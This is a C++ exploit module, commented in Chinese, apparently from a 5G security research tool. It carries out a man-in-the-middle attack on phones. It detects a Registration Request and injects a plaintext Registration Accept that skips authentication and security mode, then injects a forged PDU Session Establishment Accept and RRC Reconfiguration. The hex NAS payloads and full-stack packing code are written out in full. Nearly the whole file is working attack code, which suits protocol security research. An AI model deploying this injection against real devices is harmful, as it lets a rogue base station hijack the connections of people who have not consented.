/**
 * @file plaintext_registration_accept.cc
 * @brief 主动攻击模块 —— 明文注册接受 + PDU会话建立接受 注入 (MITM 核心模块)
 *
 * 攻击原理 (跳过安全模式的中间人攻击)：
 *   正常 5G 注册流程：
 *     UE -> Registration Request -> Authentication -> Security Mode -> Registration Accept
 *   本攻击跳过 Authentication 和 Security Mode 步骤，在 UE 发送 Registration Request
 *   后直接注入明文的 Registration Accept，使 UE 误以为已成功注册到网络。
 *
 *   随后当 UE 发起 PDU Session Establishment Request 时，再注入 PDU Session
 *   Establishment Accept + RRC Reconfiguration，完成虚假的数据面建立。
 *
 * 消息构造 (从内到外的协议栈封装)：
 *   NAS 明文消息 -> ASN.1 RRC DL-DCCH 封装 -> RLC AM 添加头 -> MAC-NR 打包
 *
 * 这是本项目中**最复杂的攻击模块**，涉及完整的 5G 协议栈消息构造。
 */

#include "shadower/modules/exploit.h"
#include "shadower/utils/utils.h"
#include "srsran/asn1/rrc_nr.h"
#include "srsran/common/byte_buffer.h"

/**
 * NAS Registration Accept 明文消息 (十六进制字符串)
 *
 * 内容概要：
 *   - 安全头类型 = 明文 (未加密、未完整性保护)
 *   - 5GMM消息类型 = Registration Accept (0x42)
 *   - 包含 5G-GUTI、TAI List、NSSAI 等注册参数
 */
std::string reg_acpt_nas =
    "7e0400000000017e0042010177000bf200f110020040ed00d2a554072000f11000000115020101210201005e0129";

/**
 * NAS PDU Session Establishment Accept 明文消息 (十六进制字符串)
 *
 * 内容概要：
 *   - PDU Session ID、QoS 规则、DNN (数据网络名称)
 *   - IP 地址分配、PCO (协议配置选项，含 DNS 等)
 */
std::string nas_pdu_est_acpt =
    "7e0400000000037e00680100612e0513c211000901000631310101ff010603f42403f4242905010a2d00022201017900060120410101097b00"
    "2a8080211002000010810608080808830608080404000d0408080808000d0408080404001002057800110025080764656661756c741205";

/**
 * 预编码的 RRC Reconfiguration DL-DCCH 消息 (用于 PDU 会话建立)
 *
 * 这是 ASN.1 PER 编码后的 RRC Reconfiguration 消息，包含：
 *   - RadioBearerConfig (数据承载配置)
 *   - CellGroupConfig (小区组配置)
 *   - dedicatedNAS-MessageList (携带上面的 NAS PDU Session Accept)
 */
uint8_t pdu_est_acpt[] = {
    0x6,  0x8a, 0x80, 0x40, 0x9a, 0x5,  0xe0, 0x2,  0x5,  0xe3, 0xf0, 0xa5, 0x0,  0xd2, 0xc0, 0x15, 0x84, 0x88,
    0x8b, 0xd7, 0x63, 0x80, 0x83, 0x2f, 0x0,  0x5,  0x8e, 0x1,  0x86, 0x2a, 0xfe, 0x40, 0x90, 0x69, 0xe0, 0x80,
    0x20, 0x46, 0x0,  0x40, 0x1c, 0x1f, 0x80, 0x94, 0x3d, 0x8b, 0xb2, 0x0,  0xdf, 0x80, 0x1a, 0x0,  0x40, 0x18,
    0x4b, 0x81, 0x44, 0xf0, 0x84, 0x40, 0x2,  0x40, 0x40, 0x1,  0x8c, 0x4c, 0x40, 0x40, 0x7f, 0xc0, 0x41, 0x80,
    0xfd, 0x9,  0x0,  0xfd, 0x9,  0xa,  0x41, 0x40, 0x42, 0x8b, 0x40, 0x0,  0x88, 0x80, 0x40, 0x5e, 0x40, 0x1,
    0x80, 0x48, 0x10, 0x40, 0x40, 0x42, 0x5e, 0xc0, 0xa,  0xa0, 0x20, 0x8,  0x44, 0x0,  0x80, 0x0,  0x4,  0x20,
    0x41, 0x82, 0x2,  0x2,  0x2,  0x20, 0xc1, 0x82, 0x2,  0x1,  0x1,  0x0,  0x3,  0x41, 0x2,  0x2,  0x2,  0x2,
    0x0,  0x3,  0x41, 0x2,  0x2,  0x1,  0x1,  0x0,  0x4,  0x0,  0x81, 0x5e, 0x0,  0x4,  0x40, 0x9,  0x42, 0x1,
    0xd9, 0x19, 0x59, 0x98, 0x5d, 0x5b, 0x1d, 0x4,  0x81, 0x40};

uint8_t ack_rlc[5]    = {0x01, 0x03, 0x00, 0x01, 0x00}; ///< RLC STATUS PDU (ACK) 模板
uint8_t rrc_nr_mac[4] = {0};                              ///< PDCP MAC-I 字段 (明文模式下全零)

class PlaintextRegistrationAccept : public Exploit
{
public:
  PlaintextRegistrationAccept(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                              SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    // 构造时即完成消息封装 (NAS -> RRC -> RLC -> MAC 的全栈打包)
    prepare_registration_accept();
    prepare_pdu_establishment_accept();
  }

  void setup() override
  {
    f_ack_sn               = wd_field("rlc-nr.am.ack-sn");
    f_sn                   = wd_field("rlc-nr.am.sn");
    f_registration_request = wd_filter("nas_5gs.mm.message_type == 0x41"); // Registration Request
    f_pdu_est_request      = wd_filter("nas_5gs.sm.message_type == 0xc1"); // PDU Session Est Request
    f_rrc_setup_request    = wd_filter("nr-rrc.c1 == 0");                  // RRC Setup Request
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_pdu_est_request);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // --- RLC 序列号跟踪 ---
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      // 新 RRC 连接 -> 重置序列号
      if (wd_read_filter(wd, f_rrc_setup_request)) {
        dl_sn     = 0;
        dl_ack_sn = 1;
      }

      // 第一步：检测到 Registration Request -> 注入 Registration Accept
      if (wd_read_filter(wd, f_registration_request)) {
        logger.info("\033[0;31mRegistration request detected\033[0m");
        prepare_and_send_reg_acpt();
      }

      // 第二步：检测到 PDU Session Est Request -> 注入 PDU Session Est Accept
      if (wd_read_filter(wd, f_pdu_est_request)) {
        logger.info("\033[0;31mPDU establishment request detected\033[0m");
        prepare_and_send_pdu_est();
      }
    }
  }

private:
  /** @brief 更新 RLC 序列号后发送 Registration Accept */
  void prepare_and_send_reg_acpt()
  {
    reg_acpt_msg->data()[3]  = 0xff & dl_ack_sn; // STATUS PDU ACK SN
    reg_acpt_msg->data()[8]  = 0xff & dl_sn;     // 数据 PDU SN
    reg_acpt_msg->data()[10] = 0xff & dl_sn;     // 冗余 SN
    dl_buffer_queue.push(reg_acpt_msg);
  }

  /** @brief 更新 RLC 序列号后发送 PDU Session Establishment Accept */
  void prepare_and_send_pdu_est()
  {
    pdu_est_acpt_msg->data()[3]  = 0xff & dl_ack_sn;
    pdu_est_acpt_msg->data()[8]  = 0xff & dl_sn;
    pdu_est_acpt_msg->data()[10] = 0xff & dl_sn;
    dl_buffer_queue.push(pdu_est_acpt_msg);
  }

  /**
   * @brief 构造 Registration Accept 消息 (全栈封装)
   *
   * 封装流程：
   *   1. NAS 十六进制字符串 -> ASN.1 DL-DCCH (DLInformationTransfer.dedicatedNAS-Message)
   *   2. DL-DCCH -> RRC-NR PER 编码
   *   3. RRC-NR -> RLC AM 添加头 (SN + PDCP COUNT + MAC-I)
   *   4. RLC-NR -> MAC-NR SDU 打包 (添加 MAC 子头 + LCID)
   *   5. 前缀 RLC STATUS PDU (ACK) -> 最终的完整注入载荷
   */
  void prepare_registration_accept()
  {
    srsran::unique_byte_buffer_t rrc_nr_buffer = srsran::make_byte_buffer();
    /* 步骤 1-2：NAS -> RRC DL-DCCH -> PER 编码 */
    asn1::rrc_nr::dl_dcch_msg_s dl_dcch_msg = pack_nas_to_dl_dcch(reg_acpt_nas);
    if (!pack_dl_dcch_to_rrc_nr(rrc_nr_buffer, dl_dcch_msg)) {
      printf("Failed to pack nas to rrc_nr\n");
    }

    /* 步骤 3：RRC -> RLC AM (添加 AM 头 + PDCP 头 + MAC-I) */
    srsran::unique_byte_buffer_t rlc_nr_buffer = srsran::make_byte_buffer();
    pack_rrc_nr_to_rlc_nr(rrc_nr_buffer->msg, rrc_nr_buffer->N_bytes, dl_sn, dl_sn, rrc_nr_mac, rlc_nr_buffer);

    /* 步骤 4：RLC -> MAC-NR (添加 MAC 子头，LCID=0 即 DCCH SRB1，最大 64 字节 SDU) */
    srsran::byte_buffer_t mac_nr_buffer;
    pack_rlc_nr_to_mac_nr(rlc_nr_buffer->msg, rlc_nr_buffer->N_bytes, 0, mac_nr_buffer, 64);

    /* 步骤 5：拼接 RLC STATUS PDU (ACK) + MAC-NR 数据 */
    reg_acpt_msg = std::make_shared<std::vector<uint8_t> >(sizeof(ack_rlc) + mac_nr_buffer.N_bytes);
    memcpy(reg_acpt_msg->data(), ack_rlc, sizeof(ack_rlc));
    memcpy(reg_acpt_msg->data() + sizeof(ack_rlc), mac_nr_buffer.msg, mac_nr_buffer.N_bytes);
  }

  /**
   * @brief 构造 PDU Session Establishment Accept 消息
   *
   * 流程：
   *   1. 解码预编码的 RRC Reconfiguration (pdu_est_acpt[] 字节数组)
   *   2. 将 NAS PDU Session Accept 填入 dedicatedNAS-MessageList
   *   3. 重新 PER 编码 -> RLC -> MAC 封装
   */
  void prepare_pdu_establishment_accept()
  {
    /* 解码预编码的 DL-DCCH RRC Reconfiguration 消息 */
    asn1::rrc_nr::dl_dcch_msg_s pdu_est_acpt_dl_dcch;
    asn1::cbit_ref              bref(pdu_est_acpt, sizeof(pdu_est_acpt));
    asn1::SRSASN_CODE           err = pdu_est_acpt_dl_dcch.unpack(bref);
    if (err != asn1::SRSASN_SUCCESS ||
        pdu_est_acpt_dl_dcch.msg.type().value != asn1::rrc_nr::dl_dcch_msg_type_c::types_opts::c1) {
      printf("Failed to unpack DL-DCCH message.\n");
      return;
    }

    /* 将 NAS PDU Session Accept 填入 RRC Reconfiguration 的 dedicatedNAS-MessageList */
    asn1::rrc_nr::rrc_recfg_s&     rrc_recfg     = pdu_est_acpt_dl_dcch.msg.c1().rrc_recfg();
    asn1::rrc_nr::rrc_recfg_ies_s& rrc_recfg_ies = rrc_recfg.crit_exts.rrc_recfg();
    if (rrc_recfg_ies.non_crit_ext_present) {
      asn1::bounded_array<asn1::dyn_octstring, 29>& nas_list         = rrc_recfg_ies.non_crit_ext.ded_nas_msg_list;
      asn1::dyn_octstring&                          pdu_est_acpt_nas = nas_list[0];
      pdu_est_acpt_nas.from_string(nas_pdu_est_acpt); // 用我们的 NAS 消息替换
    }

    /* PER 重新编码 */
    srsran::unique_byte_buffer_t reg_recfg_buf = srsran::make_byte_buffer();
    if (!pack_dl_dcch_to_rrc_nr(reg_recfg_buf, pdu_est_acpt_dl_dcch)) {
      printf("Failed to pack DL-DCCH message.\n");
      return;
    }

    /* RRC -> RLC (SN=7，表示这是注册流程中较后的消息) */
    srsran::unique_byte_buffer_t rlc_nr_buffer = srsran::make_byte_buffer();
    pack_rrc_nr_to_rlc_nr(reg_recfg_buf->msg, reg_recfg_buf->N_bytes, 7, 7, rrc_nr_mac, rlc_nr_buffer);

    /* RLC -> MAC-NR (LCID=2 即 SRB2，最大 256 字节 SDU) */
    srsran::byte_buffer_t pdu_est_acpt_mac_nr;
    pack_rlc_nr_to_mac_nr(rlc_nr_buffer->msg, rlc_nr_buffer->N_bytes, 2, pdu_est_acpt_mac_nr, 256);

    pdu_est_acpt_msg = std::make_shared<std::vector<uint8_t> >(pdu_est_acpt_mac_nr.N_bytes);
    memcpy(pdu_est_acpt_msg->data(), pdu_est_acpt_mac_nr.msg, pdu_est_acpt_mac_nr.N_bytes);
  }

  wd_filter_t f_registration_request;
  wd_filter_t f_rrc_setup_request;
  wd_filter_t f_pdu_est_request;
  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;

  uint32_t dl_sn     = 0;  ///< 当前下行发送 SN
  uint32_t dl_ack_sn = 1;  ///< 当前下行 ACK SN

  std::shared_ptr<std::vector<uint8_t> > reg_acpt_msg;     ///< 封装好的 Registration Accept 载荷
  std::shared_ptr<std::vector<uint8_t> > pdu_est_acpt_msg; ///< 封装好的 PDU Session Accept 载荷
};

/* 模块工厂函数 */
extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new PlaintextRegistrationAccept(dl_buffer_queue_, ul_buffer_queue_);
}
}
